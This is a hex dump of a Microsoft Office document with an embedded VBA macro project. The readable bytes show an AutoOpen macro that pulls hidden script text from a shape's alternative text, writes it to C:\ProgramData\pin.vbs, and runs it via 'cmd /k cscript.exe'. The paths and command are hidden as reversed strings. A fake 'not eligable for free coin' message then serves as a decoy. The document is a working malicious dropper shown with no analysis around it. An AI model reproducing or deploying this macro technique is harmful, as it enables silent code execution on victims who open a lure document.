00010010: 7400 5300 7500 6d00 6d00 6100 7200 7900  t.S.u.m.m.a.r.y.
00010020: 4900 6e00 6600 6f00 7200 6d00 6100 7400  I.n.f.o.r.m.a.t.
00010030: 6900 6f00 6e00 0000 0000 0000 0000 0000  i.o.n...........
00010040: 3800 0201 ffff ffff ffff ffff ffff ffff  8...............
00010050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00010060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00010070: 0000 0000 7500 0000 0010 0000 0000 0000  ....u...........
00010080: 4d00 6100 6300 7200 6f00 7300 0000 0000  M.a.c.r.o.s.....
00010090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000100a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000100b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000100c0: 0e00 0101 0100 0000 1100 0000 0f00 0000  ................
000100d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000100e0: 0000 0000 80d3 5de6 c08b d801 80d3 5de6  ......].......].
000100f0: c08b d801 0000 0000 0000 0000 0000 0000  ................
00010100: 5600 4200 4100 0000 0000 0000 0000 0000  V.B.A...........
00010110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00010120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00010130: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00010140: 0800 0100 ffff ffff ffff ffff 0a00 0000  ................
00010150: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00010160: 0000 0000 80d3 5de6 c08b d801 80d3 5de6  ......].......].
00010170: c08b d801 0000 0000 0000 0000 0000 0000  ................
00010180: 6200 7800 6800 0000 0000 0000 0000 0000  b.x.h...........
00010190: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000101a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000101b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000101c0: 0800 0201 ffff ffff ffff ffff ffff ffff  ................
000101d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000101e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000101f0: 0000 0000 0000 0000 1d0c 0000 0000 0000  ................
00010200: fdff ffff 9300 0000 8300 0000 8400 0000  ................
00010210: 8500 0000 8600 0000 8700 0000 8800 0000  ................
00010220: 8a00 0000 9700 0000 8b00 0000 8c00 0000  ................
00010230: 8d00 0000 8e00 0000 8f00 0000 9000 0000  ................
00010240: 9100 0000 9200 0000 9400 0000 feff ffff  ................
00010250: 9500 0000 9600 0000 9800 0000 a500 0000  ................
00010260: 9900 0000 9a00 0000 a400 0000 9c00 0000  ................
00010270: 9d00 0000 9e00 0000 9f00 0000 a000 0000  ................
00010280: a100 0000 a200 0000 a300 0000 feff ffff  ................
00010290: feff ffff feff ffff ffff ffff ffff ffff  ................
000102a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000102b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000102c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000102d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000102e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000102f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010300: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010310: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010320: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010330: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010340: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010350: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010360: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010370: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010380: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010390: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000103a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000103b0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000103c0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000103d0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000103e0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000103f0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010400: 0100 0000 0200 0000 0300 0000 0400 0000  ................
00010410: 0500 0000 0600 0000 0700 0000 0800 0000  ................
00010420: 0900 0000 0a00 0000 0b00 0000 0c00 0000  ................
00010430: 0d00 0000 0e00 0000 0f00 0000 1000 0000  ................
00010440: 1100 0000 1200 0000 1300 0000 1400 0000  ................
00010450: 1500 0000 1600 0000 1700 0000 1800 0000  ................
00010460: 1900 0000 1a00 0000 1b00 0000 1c00 0000  ................
00010470: 1d00 0000 1e00 0000 1f00 0000 2000 0000  ............ ...
00010480: 2100 0000 2200 0000 2300 0000 2400 0000  !..."...#...$...
00010490: 2500 0000 2600 0000 2700 0000 2800 0000  %...&...'...(...
000104a0: 2900 0000 2a00 0000 2b00 0000 2c00 0000  )...*...+...,...
000104b0: 2d00 0000 2e00 0000 2f00 0000 3000 0000  -......./...0...
000104c0: feff ffff 3200 0000 3300 0000 3400 0000  ....2...3...4...
000104d0: 3500 0000 3600 0000 3700 0000 3800 0000  5...6...7...8...
000104e0: 3900 0000 3a00 0000 3b00 0000 3c00 0000  9...:...;...<...
000104f0: 3d00 0000 3e00 0000 3f00 0000 4000 0000  =...>...?...@...
00010500: 4100 0000 4200 0000 feff ffff 4400 0000  A...B.......D...
00010510: 4500 0000 4600 0000 4700 0000 4800 0000  E...F...G...H...
00010520: 4900 0000 4a00 0000 4b00 0000 4c00 0000  I...J...K...L...
00010530: 4d00 0000 4e00 0000 4f00 0000 5000 0000  M...N...O...P...
00010540: 5100 0000 5200 0000 5300 0000 5400 0000  Q...R...S...T...
00010550: 5500 0000 5600 0000 5700 0000 5800 0000  U...V...W...X...
00010560: 5900 0000 5a00 0000 5b00 0000 5c00 0000  Y...Z...[...\...
00010570: 5d00 0000 5e00 0000 5f00 0000 6000 0000  ]...^..._...`...
00010580: 6100 0000 6200 0000 6300 0000 6400 0000  a...b...c...d...
00010590: 6500 0000 6600 0000 6700 0000 6800 0000  e...f...g...h...
000105a0: 6900 0000 6a00 0000 6b00 0000 6c00 0000  i...j...k...l...
000105b0: 6d00 0000 6e00 0000 6f00 0000 7000 0000  m...n...o...p...
000105c0: 7100 0000 7200 0000 7300 0000 7400 0000  q...r...s...t...
000105d0: 7500 0000 7600 0000 7700 0000 7800 0000  u...v...w...x...
000105e0: 7900 0000 7a00 0000 7b00 0000 7c00 0000  y...z...{...|...
000105f0: 7d00 0000 feff ffff 7f00 0000 feff ffff  }...............
00010600: 0116 0300 06f0 0000 002a 0600 00d4 0000  .........*......
00010610: 0028 0200 00ff ffff fff2 0600 002a 0a00  .(...........*..
00010620: 0000 0000 0001 0000 007e 8ff2 d100 00ff  .........~......
00010630: ff03 0000 0000 0000 00b6 00ff ff01 0100  ................
00010640: 0000 00ff ffff ff00 0000 00ff ff08 00ff  ................
00010650: ff00 0000 0000 0000 0000 0000 0000 0000  ................
00010660: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00010670: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00010680: 0000 0000 0000 0010 0000 0003 0000 0005  ................
00010690: 0000 0007 0000 00ff ffff ffff ffff ff01  ................
000106a0: 0108 0000 00ff ffff ff78 0000 0002 0000  .........x......
000106b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000106c0: 0000 0000 0000 0000 0000 0000 0000 ffff  ................
000106d0: 0000 0000 4d45 0000 ffff ffff ffff 0000  ....ME..........
000106e0: 0000 ffff 0000 0000 ffff 0101 0000 0000  ................
000106f0: df00 ffff 0000 0000 4800 ffff ffff ffff  ........H.......
00010700: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010710: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010720: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010730: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010740: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010750: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010760: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010770: ffff ffff ffff ffff ffff a000 0000 0000  ................
00010780: 360a ffff ffff 0000 0000 1a94 ffff ffff  6...............
00010790: 0000 0000 1a4c ffff ffff 0000 0000 1a4c  .....L.........L
000107a0: ffff ffff 0000 0000 1a4c ffff ffff 0000  .........L......
000107b0: 0000 1a08 ffff ffff 0000 0000 1a08 ffff  ................
000107c0: ffff 0000 0000 1a08 ffff ffff 0000 0000  ................
000107d0: 1a08 ffff ffff 0000 0000 023c 5000 ffff  ...........<P...
000107e0: 0000 0000 023c 5800 ffff 0000 0000 023c  .....<X........<
000107f0: 6000 ffff 0000 0000 023c 6800 ffff 0000  `........<h.....
00010800: 0000 023c 7000 ffff 0000 0000 023c 7800  ...<p........<x.
00010810: ffff 0000 0000 023c ffff ffff 0000 ffff  .......<........
00010820: 0101 0000 0000 0000 0100 0000 0000 ffff  ................
00010830: ffff 0101 7003 0000 ffff ffff 8800 0000  ....p...........
00010840: 0283 3202 ffff ffff 0000 0000 ffff ffff  ..2.............
00010850: 3800 0000 0000 ffff ffff ffff 0000 0000  8...............
00010860: ffff ffff ffff ffff 0000 0000 0000 0000  ................
00010870: 1d00 0000 2500 0000 ffff ffff 3802 4002  ....%.......8.@.
00010880: b000 5202 5002 5602 5802 5a02 0800 0000  ..R.P.V.X.Z.....
00010890: 6084 3602 ffff ffff f8ff ffff ffff ffff  `.6.............
000108a0: 0900 ffff 0000 0000 6084 3c02 ffff ffff  ........`.<.....
000108b0: a8ff ffff ffff ffff 0900 ffff 0000 0000  ................
000108c0: 0b12 5c02 ffff ffff 0000 0060 0000 0000  ..\........`....
000108d0: ffff ffff ffff ffff 0000 0000 0000 0000  ................
000108e0: 0000 0000 0000 0000 e800 0000 50fe ffff  ............P...
000108f0: 6b00 0000 0000 0000 ffff ffff ffff ffff  k...............
00010900: ffff 0000 1700 1700 0000 0000 0000 0000  ................
00010910: 8400 0003 0000 0000 ffff ffff 1800 0000  ................
00010920: 6002 0000 a802 0000 ffff ffff f002 0000  `...............
00010930: ffff ffff 5800 0000 7000 0000 ffff ffff  ....X...p.......
00010940: ffff ffff 0803 0000 ffff ffff 4802 0000  ............H...
00010950: 3002 0000 ffff ffff 0002 0000 ffff ffff  0...............
00010960: ffff ffff d802 0000 8801 0000 d001 0000  ................
00010970: ffff ffff b801 0000 ffff ffff ffff ffff  ................
00010980: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010990: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000109a0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
000109b0: ffff ffff ffff ffff 4000 0000 ffff ffff  ........@.......
000109c0: 4004 feff a001 0000 f0ff ffff ffff ffff  @...............
000109d0: 0900 ffff 2000 0000 4004 feff e801 0000  .... ...@.......
000109e0: e8ff ffff ffff ffff 0900 ffff 2000 0000  ............ ...
000109f0: 4004 feff c002 0000 d0ff ffff ffff ffff  @...............
00010a00: 0c00 ffff 2000 0000 4004 feff 1802 0000  .... ...@.......
00010a10: b8ff ffff ffff ffff 0c00 ffff 2000 0000  ............ ...
00010a20: 4004 feff ffff ffff b0ff ffff ffff ffff  @...............
00010a30: 0900 ffff 2000 0000 4004 3e02 ffff ffff  .... ...@.>.....
00010a40: 90ff ffff ffff ffff 0c00 ffff 0000 0000  ................
00010a50: 4004 feff 7802 0000 78ff ffff ffff ffff  @...x...x.......
00010a60: 0c00 ffff 2000 0000 4004 4202 ffff ffff  .... ...@.B.....
00010a70: 60ff ffff ffff ffff 0c00 ffff 0000 0000  `...............
00010a80: 4004 4402 ffff ffff 48ff ffff ffff ffff  @.D.....H.......
00010a90: 0c00 ffff 0000 0000 4004 4602 ffff ffff  ........@.F.....
00010aa0: 30ff ffff ffff ffff 0c00 ffff 0000 0000  0...............
00010ab0: 4004 feff 5003 0000 18ff ffff ffff ffff  @...P...........
00010ac0: 0c00 ffff 2000 0000 4004 4802 ffff ffff  .... ...@.H.....
00010ad0: 00ff ffff ffff ffff 0c00 ffff 0000 0000  ................
00010ae0: 4004 4c02 ffff ffff e8fe ffff ffff ffff  @.L.............
00010af0: 0c00 ffff 0000 0000 4004 feff 2003 0000  ........@... ...
00010b00: d0fe ffff ffff ffff 0c00 ffff 2000 0000  ............ ...
00010b10: 4004 feff ffff ffff c8fe ffff ffff ffff  @...............
00010b20: 0800 ffff 2000 0000 4004 4e02 ffff ffff  .... ...@.N.....
00010b30: b0fe ffff ffff ffff 0c00 ffff 0000 0000  ................
00010b40: 4004 5402 9002 0000 98fe ffff ffff ffff  @.T.............
00010b50: 0c00 ffff 0000 0000 4004 feff 3803 0000  ........@...8...
00010b60: 80fe ffff ffff ffff 0c00 ffff 2000 0000  ............ ...
00010b70: 4004 feff ffff ffff 68fe ffff ffff ffff  @.......h.......
00010b80: 0c00 ffff 2000 0000 4004 feff ffff ffff  .... ...@.......
00010b90: 50fe ffff ffff ffff 0c00 ffff 2000 0000  P........... ...
00010ba0: ffff ffff 3000 0000 0100 0100 0000 0000  ....0...........
00010bb0: 0000 0000 0000 0000 8800 0000 ffff ffff  ................
00010bc0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010bd0: 8800 0000 ffff ffff ffff ffff ffff ffff  ................
00010be0: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010bf0: 0800 0000 0000 0000 0000 0000 1000 0000  ................
00010c00: 0800 ffff ffff 0000 0000 ffff ffff ffff  ................
00010c10: ffff ffff ffff ffff ffff ffff ffff ffff  ................
00010c20: ffff 0000 0200 0000 0000 5ac8 b764 0a00  ..........Z..d..
00010c30: 0124 002a 005c 0052 0066 0066 0066 0066  .$.*.\.R.f.f.f.f
00010c40: 002a 0030 0039 0036 0034 0062 0037 0063  .*.0.9.6.4.b.7.c
00010c50: 0038 0035 0061 0001 1200 2a00 5c00 5200  .8.5.a....*.\.R.
00010c60: 3100 2a00 2300 3100 3700 6200 0110 002a  1.*.#.1.7.b....*
00010c70: 005c 0052 0031 002a 0023 0063 0031 0001  .\.R.1.*.#.c.1..
00010c80: 1000 2a00 5c00 5200 3100 2a00 2300 6300  ..*.\.R.1.*.#.c.
00010c90: 3600 0112 002a 005c 0052 0031 002a 0023  6....*.\.R.1.*.#
00010ca0: 0031 0035 0032 0001 0e00 2a00 5c00 5200  .1.5.2....*.\.R.
00010cb0: 3000 2a00 2300 6600 0110 002a 005c 0052  0.*.#.f....*.\.R
00010cc0: 0030 002a 0023 0031 0032 0001 1000 2a00  .0.*.#.1.2....*.
00010cd0: 5c00 5200 3000 2a00 2300 3100 3700 0110  \.R.0.*.#.1.7...
00010ce0: 002a 005c 0052 0030 002a 0023 0031 0033  .*.\.R.0.*.#.1.3
00010cf0: 00df 0000 0000 0000 0000 0000 0000 0000  ................
00010d00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00010d10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00010d20: 0000 0000 0000 0000 0000 0000 0000 feca  ................
00010d30: 0100 1700 2281 0800 0600 0600 0000 0000  ...."...........
00010d40: 0080 0804 0800 0000 0800 0000 0081 0804  ................
00010d50: 1400 6400 1000 0000 0080 0804 0800 0000  ..d.............
00010d60: 2800 0000 0081 0804 1400 6400 3000 0000  (.........d.0...
00010d70: 0081 0804 1e00 1c00 4800 0000 0081 0804  ........H.......
00010d80: 1c00 2e00 6800 0000 0081 0804 0e00 1c00  ....h...........
00010d90: 8800 0000 0081 0804 1800 1c00 9800 0000  ................
00010da0: 0081 0804 1600 3a00 b000 0000 0081 0804  ......:.........
00010db0: 0800 2400 c800 0000 0081 0804 1000 2a00  ..$...........*.
00010dc0: d000 0000 0081 0804 0e00 1a00 e000 0000  ................
00010dd0: 0081 0804 0a00 1000 f000 0000 0081 0804  ................
00010de0: 4800 6000 0001 0000 0080 0904 0000 0000  H.`.............
00010df0: ffff ffff 0081 0804 1e00 4600 4801 0000  ..........F.H...
00010e00: 0081 0804 0e00 2c00 6801 0000 0081 0804  ......,.h.......
00010e10: 0200 0c00 7801 0000 0081 0804 3e00 4c00  ....x.......>.L.
00010e20: 8001 0000 0081 0804 0200 0800 c001 0000  ................
00010e30: 0080 0904 0000 0000 ffff ffff 0481 0800  ................
00010e40: 0200 0800 c801 0000 ffff ffff 0101 d801  ................
00010e50: 0000 9604 8800 0000 0000 5d00 f504 5800  ..........]...X.
00010e60: 0000 f000 ac00 0100 2000 3802 2500 3a02  ........ .8.%.:.
00010e70: 0100 2e00 3602 0000 0000 5d00 f504 7000  ....6.....]...p.
00010e80: 0000 f000 ac00 0200 2000 3802 2500 3a02  ........ .8.%.:.
00010e90: 0100 2e00 3c02 0000 0000 b900 0f00 5c61  ....<.........\a
00010ea0: 7461 446d 6172 676f 7250 5c3a 4300 2400  taDmargorP\:C.$.
00010eb0: 4002 0100 2700 3e02 0000 2000 3e02 b900  @...'.>... .>...
00010ec0: 0700 7362 762e 6e69 7000 2400 4002 0100  ..sbv.nip.$.@...
00010ed0: 0b00 2700 4202 7800 0000 b900 0000 2400  ..'.B.x.......$.
00010ee0: 4002 0100 2700 4402 0000 b900 0a00 495a  @...'.D.......IZ
00010ef0: 4f49 5a49 4d49 5a49 2400 4002 0100 2700  OIZIMIZI$.@...'.
00010f00: 4602 2000 3602 2100 4a02 2000 3c02 2100  F. .6.!.J. .<.!.
00010f10: 4a02 0b00 2700 4802 0000 2000 b000 2700  J...'.H... ...'.
00010f20: 4c02 2000 4202 2000 4c02 1e00 ab00 cf00  L. .B. .L.......
00010f30: 0200 2000 4c02 1e00 d500 2000 4802 d900  .. .L..... .H...
00010f40: 0000 2000 4c02 1e00 5600 0100 0000 0000  .. .L...V.......
00010f50: 0000 b900 2900 7362 762e 6e69 705c 6174  ....).sbv.nip\at
00010f60: 6144 6d61 7267 6f72 505c 3a43 2065 7865  aDmargorP\:C exe
00010f70: 2e74 7069 7263 7363 206b 2f20 646d 6300  .tpircsc k/ dmc.
00010f80: 2400 4002 0100 ac00 3000 2400 5202 0100  $.@.....0.$.R...
00010f90: 2400 5002 0200 2700 4e02 2400 5602 0000  $.P...'.N.$.V...
00010fa0: b900 0800 3030 3a30 303a 3035 2400 5802  ....00:00:05$.X.
00010fb0: 0100 0b00 2700 5402 0000 2400 5602 0000  ....'.T...$.V...
00010fc0: 2000 5402 0900 f700 0000 f600 ffff 8000   .T.............
00010fd0: 0000 b900 3100 556e 666f 7274 756e 6174  ....1.Unfortunat
00010fe0: 656c 7920 796f 7520 6172 6520 6e6f 7420  ely you are not 
00010ff0: 656c 6967 6162 6c65 2066 6f72 2066 7265  eligable for fre
00011000: 6520 636f 696e 2100 1d00 4140 5a02 0100  e coin!...A@Z...
00011010: 0000 6700 ffff 3800 0000 6f00 ffff 3000  ..g...8...o...0.
00011020: 0000 ffff ffff 2800 0000 ffff ffff 0000  ......(.........
00011030: 01e9 b100 4174 7472 6962 7574 0065 2056  ....Attribut.e V
00011040: 425f 4e61 6d00 6520 3d20 2262 7868 0022  B_Nam.e = "bxh."
00011050: 0d0a 5375 6220 4100 7574 6f4f 7065 6e28  ..Sub A.utoOpen(
00011060: 1029 0d0a 2000 0044 696d 0020 5151 3120  .).. ..Dim. QQ1 
00011070: 4173 2040 4f62 6a65 6374 0358 5304 6574  As @Object.XS.et
00011080: 022c 3d20 4163 7400 6976 6544 6f63 756d  .,= Act.iveDocum
00011090: 0065 6e74 2e53 6861 7050 6573 2831 0a7c  .ent.ShapPes(1.|
000110a0: 3213 7c32 4b00 7a13 3e32 043e 524f 0022  2.|2K.z.>2.>RO."
000110b0: 5300 7472 5265 7665 7273 0065 2822 5c61  S.trRevers.e("\a
000110c0: 7461 4400 6d61 7267 6f72 505c 683a 4322  taD.margorP\h:C"
000110d0: 0627 4900 2800 2d2b 0220 092d 7362 762e  .'I.(.-+. .-sbv.
000110e0: 6e69 b270 0525 6969 0c4d 050c 4e01 8201  ni.p.%ii.M..N...
000110f0: 091c 495a 4f49 5a49 4d33 8001 0511 5757  ..IZOIZIM3....WW
00011100: 801d 0084 2e41 406c 7465 726e 6101 7a54  .....A@lterna.zT
00011110: a065 7874 202b 8083 328d 0a41 0392 4d79  .ext +..2..A..My
00011120: 4669 6c01 2d46 3872 6565 0105 030b 01af  Fil.-F8ree......
00011130: 2052 004f 4920 466f 7220 4fa0 7574 7075   R.OI For O.utpu
00011140: 7481 8f23 0317 8183 1150 7269 6e74 2004  t..#.....Print .
00011150: 0910 2c20 5757 030b 436c 6f8c 7365 050b  .., WW..Clo.se..
00011160: 0309 6675 6e81 6a60 6865 6c6c 2890 7d0c  ..fun.j`hell(.}.
00011170: 9820 0065 7865 2e74 7069 7200 6373 6320  . .exe.tpir.csc 
00011180: 6b2f 2064 006d 6322 292c 2043 6860 7228  k/ d.mc"), Ch`r(
00011190: 3438 2944 5303 1677 8061 6974 5469 6c6c  48)DS..w.aitTill
000111a0: 4017 204e 6f77 2829 403a 5469 406d 6556  @. Now()@:Ti@meV
000111b0: 616c 7500 6230 d430 3a81 0035 c647 6881  alu.b0.0:..5.Gh.
000111c0: 3a03 0a0c 3c20 c50e 4312 5765 6e64 0143  :...< ..C.Wend.C
000111d0: 024d 7367 426f 7820 0028 2255 6e66 6f72  .MsgBox .("Unfor
000111e0: 7402 75c0 5165 6c79 2079 6f00 7520 6172  t.u.Qely yo.u ar
000111f0: 6520 6e6f 0074 2065 6c69 6761 6213 804d  e no.t eligab..M
00011200: 0008 2066 004e 2063 6f28 696e 21c5 1945  .. f.N co(in!..E
00011210: 8512 0d0a 0180 0220 5375 620d 0a00 0000  ....... Sub.....
00011220: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011230: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011240: 0169 b480 0100 0400 0000 0300 302a 0202  .i..........0*..
00011250: 9009 0070 1406 4803 0082 0200 64e4 0404  ...p..H.....d...
00011260: 0007 001c 0050 726f 6a65 6374 0551 0028  .....Project.Q.(
00011270: 0000 4002 1406 0214 3dad 020a 0702 6c01  ..@.....=.....l.
00011280: 1408 0612 0902 1280 5ac8 b764 0a00 0c02  ........Z..d....
00011290: 4a12 3c02 0a16 0001 7273 7464 106f 6c65  J.<.....rstd.ole
000112a0: 3e02 1973 0074 0000 6400 6f00 6c00 6550  >..s.t..d.o.l.eP
000112b0: 000d 0068 0025 5e00 032a 005c 477b 3030  ...h.%^..*.\G{00
000112c0: 3032 30b0 3433 302d 0008 0404 4300 0a03  020.430-....C...
000112d0: 020e 0112 3030 3436 7d23 0032 2e30 2330  ....0046}#.2.0#0
000112e0: 2343 3a00 5c57 696e 646f 7773 005c 5379  #C:.\Windows.\Sy
000112f0: 7374 656d 3304 325c 0365 322e 746c 6200  stem3.2\.e2.tlb.
00011300: 234f 4c45 2041 7574 806f 6d61 7469 6f6e  #OLE Aut.omation
00011310: 0060 0300 0283 454e 6f72 6d61 6c05 8345  .`....ENormal..E
00011320: 4e80 4372 006d 0061 5180 460e 0020 8011  N.Cr.m.aQ.F.. ..
00011330: 0980 012a 2c5c 4303 120a 0646 806d 0500  ...*,\C....F.m..
00011340: 4183 214f 6666 6963 8467 4f44 0066 8000  A.!Offic.gOD.f..
00011350: 6900 6382 679e 0580 1f94 8221 477b 3244  i.c.g......!G{2D
00011360: 4600 3844 3034 432d 3542 0046 412d 3130  F.8D04C-5B.FA-10
00011370: 3142 2d90 4244 4535 8067 4141 8065 1a34  1B-.BDE5.gAA.e.4
00011380: 8005 3288 6780 ba67 7261 006d 2046 696c  ..2.g..gra.m Fil
00011390: 6573 5c40 436f 6d6d 6f6e 0406 4d00 6963  es\@Common..M.ic
000113a0: 726f 736f 6674 0020 5368 6172 6564 5c00  rosoft. Shared\.
000113b0: 4f46 4649 4345 3136 005c 4d53 4f2e 444c  OFFICE16.\MSO.DL
000113c0: 4c06 2387 1083 4d20 3136 2e30 0820 4f62  L.#...M 16.0. Ob
000113d0: 81e3 204c 6962 b072 6172 7980 2580 0016  .. Lib.rary.%...
000113e0: 8278 084d 5346 c041 733e 000e 4180 044d  .x.MSF.As>..A..M
000113f0: 0053 0046 8442 7324 0033 4002 0000 0264  .S.F.Bs$.3@....d
00011400: 6400 6900 7200 0000 0000 0000 0000 0000  d.i.r...........
00011410: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011420: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011430: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011440: 0800 0200 0700 0000 0900 0000 ffff ffff  ................
00011450: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011460: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011470: 0000 0000 3100 0000 6d04 0000 0000 0000  ....1...m.......
00011480: 5f00 5f00 5300 5200 5000 5f00 3000 0000  _._.S.R.P._.0...
00011490: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000114a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000114b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000114c0: 1000 0201 ffff ffff ffff ffff ffff ffff  ................
000114d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000114e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000114f0: 0000 0000 4300 0000 b50e 0000 0000 0000  ....C...........
00011500: 5f00 5f00 5300 5200 5000 5f00 3100 0000  _._.S.R.P._.1...
00011510: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011520: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011530: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011540: 1000 0201 0800 0000 0c00 0000 ffff ffff  ................
00011550: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011560: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00011570: 0000 0000 7e00 0000 7a00 0000 0000 0000  ....~...z.......
00011580: 5f00 5f00 5300 5200 5000 5f00 3200 0000  _._.S.R.P._.2...
00011590: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000115a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000115b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000115c0: 1000 0201 ffff ffff ffff ffff ffff ffff  ................
000115d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000115e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
000115f0: 0000 0000 8000 0000 a105 0000 0000 0000  ................
00011600: 4434 0035 3245 4531 2d45 3044 3846 0130  D4.52EE1-E0D8F.0
00011610: 412d 3800 042d 0030 3236 3038 4334 4450  A-8..-.02608C4DP
00011620: 3042 4234 1064 7305 6446 d84d 3230 4c27  0BB4.ds.dF.M20L'
00011630: 421d 20c0 70cc 26e8 2f00 3b00 2231 c000  B. .p.&./.;."1..
00011640: 4482 027c 0782 7e0c 0143 8230 307d 2330  D..|..~..C.00}#0
00011650: 1d42 8223 c00c 8000 9e35 3000 a10d 8009  .B.#.....50.....
00011660: 83c0 0041 1836 4139 4200 4542 3831 2d42  ...A.6A9B.EB81-B
00011670: 3132 0033 2d34 3138 302d 4100 4536 342d  12.3-4180-A.E64-
00011680: 4442 4435 0036 3535 4235 4239 4301 8836  DBD5.655B5B9C..6
00011690: 5573 6572 735c 3000 7864 665c 4170 7044  Users\0.xdf\AppD
000116a0: 0061 7461 5c4c 6f63 6100 6c5c 5465 6d70  .ata\Loca.l\Temp
000116b0: 5c56 0c42 4500 6282 362e 6578 640f 0863  \V.BE.b.6.exd..c
000116c0: 953b 4021 8000 e12e 450d 008f e01a 1085  .;@!....E.......
000116d0: 2e02 6020 8c4d 0bb4 01c0 0416 0001 81dd  ..` .M..........
000116e0: 4144 4f44 423e 0082 0a00 0441 0044 004f  ADODB>.....A.D.O
000116f0: c000 6a42 40cb 99c0 038f c000 4130 3200  ..jB@.......A02.
00011700: 4137 3531 3936 432d 1044 3945 4240 3032  A75196C-.D9EB@02
00011710: 392d 0042 3830 332d 3933 3100 3332 3746  9-.B803-931.327F
00011720: 3732 4435 1d42 3038 43cb 5897 0368 5c61  72D5.B08C.X..h\a
00011730: 6490 6f5c 6d73 a000 3238 4268 0147 4a41  d.o\ms..28Bh.GJA
00011740: 6374 6976 6558 d620 e11e e436 7360 3838  ctiveX. ...6s`88
00011750: 0d4b e165 0053 6372 6970 7469 6e50 673e  .K.e.ScriptinPg>
00011760: 0012 2015 53e0 6272 1000 6900 70a0 7e69  .. .S.br..i.p.~i
00011770: 006e d400 67a0 1874 e002 6a60 00a1 1840  .n..g..t..j`...@
00011780: 3432 3042 3238 607e 4500 3731 382d 3131  420B28`~E.718-11
00011790: 4346 202d 3839 3344 603e 4130 0043 3930  CF -893D`>A0.C90
000117a0: 3534 3232 3808 7d23 3177 7e63 7272 7560  54228.}#1w~crru`
000117b0: 6e2e 646c 6ca8 2e66 1020 8052 756e 7469  n.dll..f. .Runti
000117c0: 6d65 800d 6340 0063 7757 4d50 e061 e37f  me..c@.cwWMP.a..
000117d0: 5740 004d 0050 004c e013 621b e012 6112  W@.M.P.L..b...a.
000117e0: 60e0 04e1 1236 4246 0035 3241 3530 2d33  `....6BF.52A50-3
000117f0: 3922 3460 7731 4433 2045 3533 01e0 1243  9"4`w1D3 E53...C
00011800: 3034 4637 3946 1c41 4160 91ee 1246 5f77  04F79F.AA`...F_w
00011810: 6d70 0382 1284 9420 4d65 6469 6180 2050  mp..... Media. P
00011820: 6c61 7965 7240 0c45 4000 0f42 ae02 0013  layer@.E@..B....
00011830: e200 7e04 8f19 a2a3 5468 6973 4400 6f63  ..~.....ThisD.oc
00011840: 756d 656e 7447 1400 18e0 0454 60a4 6900  umentG.....T`.i.
